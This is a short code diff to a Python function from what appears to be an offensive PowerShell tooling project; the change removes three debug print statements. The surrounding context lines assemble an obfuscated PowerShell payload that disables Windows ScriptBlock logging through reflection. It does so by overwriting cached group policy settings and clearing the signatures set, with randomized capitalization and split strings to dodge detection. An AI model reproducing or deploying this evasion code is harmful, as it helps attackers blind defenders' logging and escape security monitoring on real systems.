@@ -4,9 +4,7 @@ from . import helpers
 
 def scriptBlockLogBypass():
     # ScriptBlock Logging bypass
-    print('bypasses: 7')
     bypass = helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPF")+"=[ref].Assembly.GetType(")
-    print('bypasses: 9')
     bypass += "'System.Management.Automation.Utils'"
     bypass += helpers.randomize_capitalization(").\"GetFie`ld\"(")
     bypass += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
@@ -26,7 +24,6 @@ def scriptBlockLogBypass():
     bypass += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
     bypass += "'signatures','N'+'onPublic,Static'"
     bypass += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
-    print('bypasses: 28')
     return bypass
 
 
